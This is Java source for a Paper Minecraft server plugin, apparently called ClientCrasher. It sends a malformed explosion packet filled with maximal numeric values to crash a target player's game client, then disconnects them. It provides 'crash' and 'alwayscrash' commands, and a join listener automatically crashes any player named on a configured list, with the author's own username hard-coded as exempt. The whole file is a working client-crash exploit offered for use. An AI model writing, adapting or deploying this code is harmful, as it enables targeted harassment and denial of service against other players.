package dev.gotitim.clientcrasher;

import dev.gotitim.clientcrasher.command.AlwaysCrashCommand;
import dev.gotitim.clientcrasher.command.CrashCommand;
import net.kyori.adventure.text.Component;
import net.minecraft.core.particles.ExplosionParticleInfo;
import net.minecraft.core.particles.ParticleTypes;
import net.minecraft.core.particles.ShriekParticleOption;
import net.minecraft.network.protocol.game.ClientboundExplodePacket;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.sounds.SoundEvents;
import net.minecraft.util.random.WeightedList;
import net.minecraft.world.phys.Vec3;
import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;

import java.util.Optional;

public final class ClientCrasherPaper extends JavaPlugin implements Listener {
    private static ClientCrasherPaper instance;

    @Override
    public void onEnable() {
        instance = this;
        saveDefaultConfig();
        getCommand("crash").setExecutor(new CrashCommand());
        getCommand("alwayscrash").setExecutor(new AlwaysCrashCommand());

        getServer().getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() {
        saveConfig();
    }

    public static void crashPlayer(Player player) {
        ServerPlayer serverPlayer = ((CraftPlayer) player).getHandle();
        if (!player.getName().equals("gotitim")) {
            serverPlayer.connection.send(new ClientboundExplodePacket(
                    new Vec3(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE),
                    Float.MAX_VALUE,
                    Integer.MAX_VALUE,
                    Optional.of(new Vec3(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)),
                    ParticleTypes.EXPLOSION,
                    SoundEvents.GENERIC_EXPLODE,
                    WeightedList.of(new ExplosionParticleInfo(new ShriekParticleOption(0), Float.MAX_VALUE, Float.MAX_VALUE))
            ));
        }
        Bukkit.getScheduler().runTaskLater(getInstance(), () -> serverPlayer.connection.disconnect(Component.empty()), 5);
    }

    public static ClientCrasherPaper getInstance() {
        return instance;
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        String nick = event.getPlayer().getName();
        String uuid = event.getPlayer().getUniqueId().toString();
        for (String idNick : ClientCrasherPaper.getInstance().getConfig().getStringList("always-crash")) {
            if(nick.equals(idNick) || uuid.equals(idNick)) {
                Bukkit.getScheduler().runTaskLater(this, () -> crashPlayer(event.getPlayer()), 10);
                return;
            }
        }
    }
}
